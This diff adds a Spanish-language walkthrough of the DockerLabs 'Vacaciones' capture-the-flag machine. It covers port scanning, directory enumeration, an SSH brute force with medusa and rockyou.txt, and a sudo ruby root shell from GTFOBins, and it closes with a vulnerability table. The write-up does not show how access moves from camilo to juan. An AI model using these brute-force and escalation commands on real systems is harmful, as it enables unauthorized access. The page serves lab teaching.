@@ -1,0 +1,199 @@
+---
+title: Vacaciones
+description: Resolución completa de la máquina virtual *Vacaciones* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Vacaciones**, desarrollada por *Romabri* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
+El laboratorio expone un servidor web que contiene un comentario en el código fuente del `index`, revelando dos posibles nombres de usuario: `camilo` y `juan`. Tras realizar un ataque de fuerza bruta contra el servicio SSH, se obtiene acceso al sistema como el usuario `camilo`.
+Una vez dentro, se encuentra un correo en `/var/mail/camilo` que indica que el usuario `juan` tiene permisos sudo para ejecutar `ruby` como root. Se utiliza `searchbins` para identificar la técnica de GTFOBins y se ejecuta el comando adecuado, obteniendo acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Vacaciones',
+    Autor: 'Romabri',
+    Dificultad: 'Muy Fácil',
+    Fecha: '02/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Vacaciones.zip
+sudo bash auto_deplo.sh Vacaciones.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Vacaciones/{content,exploits,nmap,scripts}
+cd Vacaciones
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748411789/Ports_mcm2ne.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+![Servicios detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1748411791/Services_yk9s5r.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1748411785/gobuster_b6zgci.png)
+
+Se descubren dos rutas: una al `index` y otra a un directorio llamado `javascript` (este último denegado). En el código fuente del `index`, se encuentra un comentario que revela dos posibles nombres de usuario: `camilo` y `juan`.
+
+![Comentario](https://res.cloudinary.com/dewqswzke/image/upload/v1748411784/Coment_dyk0dl.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+Con los nombres de usuario identificados (`camilo` y `juan`), se realiza un ataque de fuerza bruta contra el servicio SSH utilizando el diccionario `rockyou.txt`:
+
+```bash
+medusa -h 172.17.0.2 -u camilo,juan -P /usr/share/wordlists/rockyou.txt -M ssh
+```
+
+Se encuentra que `camilo` puede acceder vía SSH con una contraseña del diccionario.
+
+Se accede al sistema:
+
+```bash
+ssh camilo@172.17.0.2
+```
+
+![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1748411787/Login_c5bapm.png)
+
+---
+
+### 2.1 Búsqueda de pistas
+
+No se encuentran binarios con permisos SUID ni entradas en `sudo` que sean explotables. Sin embargo, en el comentario del `index` se mencionaba un mensaje. Se revisa el correo de `camilo`:
+
+```bash
+cat /var/mail/camilo
+```
+
+Se encuentra un mensaje de `juan` que indica que tiene permisos sudo para ejecutar `ruby`:
+
+![Juan](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/Juan_judznp.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De camilo → juan → root
+
+Se verifica que el usuario `juan` tiene permisos para ejecutar `ruby` como superusuario:
+
+```bash
+sudo -l
+```
+
+Se utiliza `searchbins` para buscar una técnica de escalado con `ruby`:
+
+```bash
+searchbins -b ruby -f sudo
+```
+
+Se ejecuta el comando sugerido por GTFOBins para obtener una shell con privilegios de root:
+
+```bash
+sudo ruby -e 'exec "/bin/sh"'
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1748411790/Root_ugalqd.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de información sensible en comentarios HTML",
+      severity: "Media",
+      impact: "Revelación de nombres de usuario válidos"
+    },
+    {
+      vulnerability: "Contraseña débil para usuario camilo",
+      severity: "Crítica",
+      impact: "Acceso no autorizado mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en ruby",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Exposición de información en correo del sistema",
+      severity: "Media",
+      impact: "Revelación de permisos sudo de otros usuarios"
+    },
+    {
+      vulnerability: "Falta de políticas de bloqueo por intentos fallidos",
+      severity: "Media",
+      impact: "Ataques de fuerza bruta ilimitados"
+    }
+  ]}
+/>
